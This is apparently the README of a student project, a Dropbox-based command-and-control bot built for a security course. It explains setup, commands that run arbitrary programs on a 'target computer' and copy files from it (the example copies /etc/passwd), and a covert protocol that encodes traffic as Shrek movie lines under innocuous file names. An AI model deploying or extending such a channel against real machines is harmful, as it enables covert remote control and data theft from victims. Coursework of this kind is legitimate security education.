# Dropbox C&C bot

Command and Control system using Dropbox and steganography developed by Petr Zahradník
for the course BSY at FEE CTU in Prague. For educational purposes only.

## Installation

First, obtain a Dropbox access token. Navigate to https://www.dropbox.com/developers,
create a new app, allow `files.metadata.write`, `files.metadata.read`, `files.content.write`,
`files.content.read`. Permission type can be `Scoped App (App Folder)`. Finally click
`Generated access token` and put it into the environment variable (via bash or .env).

```env
TOKEN=sl.example123...
```

Then install the `dropbox` sdk.

```sh
pip install -r requirements.txt
```

## Usage

Run bot on the target computer:

```bash
python bot.py
```

Run server on your computer:

```bash
python server.py
```

Server is interactive, use can you it to send commands and receive responses.

Type `help` to show help.

Most useful commands are:

- `bots` refreshes the list of connected bots and displays the alive ones.
  Use the bot indexes in the further commands.
  ```
  > bots
  Connected bots:
  0: arrogant terrible Pigs
  ```
- `run` runs a user defined command on the target computer.
  ```
  > run 0 date 
  ```
- `cp` copies a file to your computer. *Note that the file is not written until 
  you run `resp`.*
  ```
  > cp 0 /etc/passwd
  ```
- `resp` refreshes command responses for a specified bot and prints them.
  ```
  > resp 0
  Responses from arrogant terrible Pigs:
  date
  Sun Jan  7 11:38:13 PM CET 2024
  
  cp /etc/passwd
  Written to: passwd
  ```

## Protocol

The communication happends via Dropbox API using text files only.

The server writes commands into `fav_scenes/` folder and receives responses 
through `wtf_dialogues/`. Furthermore the bots send healthchecks to `quotes/`.

The health checks are random lines, but commands and responses are encoded UTF-8 bytes.
Each byte is written as a line from [Shrek movie](https://knowyourmeme.com/memes/subcultures/shrek)
using a look-up table. This way arbitrary commands are supported as well as
the whole unicode charset.

Files are given randomly generated `<adjective> <adjective> <fairytale character>.txt` names,
e.g. `amused ugly HumptyDumpty.txt`.

## Remarks

All features are supported except for

> The controller should check if the bots are alive periodically.

The healthcheck is sent periodically but the server only check them when you call `bots` command.
This is to simplify the architecture and provide predictable bot numbering scheme.

There are numerous extensions possible. For example transfering files to the victim computer would
be very easy to implement. The bot code could futhermore be enhanced to support running multiple
commands in a non-blocking way.
